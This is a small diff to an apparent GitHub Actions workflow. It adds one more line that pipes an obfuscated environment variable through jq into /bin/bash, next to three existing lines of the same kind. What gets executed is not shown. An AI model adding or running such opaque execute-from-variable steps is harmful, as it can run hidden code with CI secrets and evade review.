@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$kgpdx1522" | jq -r .k9800 | /bin/bash
           printf '%s' "$rz74231" | jq -r .czbcj69 | /bin/bash
           echo $ql64 | jq -r .dudac697 | /bin/bash
+          echo $xg0564 | jq -r .takc6358 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
